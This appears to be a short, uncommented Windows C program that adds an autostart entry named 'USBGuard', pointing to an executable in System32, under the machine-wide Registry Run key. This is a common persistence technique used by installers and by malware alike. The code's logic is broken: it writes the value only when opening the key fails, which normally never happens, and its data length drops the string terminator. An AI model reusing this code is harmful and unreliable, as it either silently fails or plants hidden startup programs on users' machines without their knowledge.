#include <Windows.h>

int main() {
    HKEY hKey;
    LPCSTR lpSubKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    LPCSTR lpValueName = "USBGuard";
    LPCSTR lpData = "C:\\Windows\\System32\\USBGuard.exe";

    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpSubKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        RegCreateKey(HKEY_LOCAL_MACHINE, lpSubKey, &hKey);
        RegSetValueEx(hKey, lpValueName, 0, REG_SZ, (LPBYTE)lpData, strlen(lpData) * sizeof(char));
        RegCloseKey(hKey);
    }

    return 0;
}
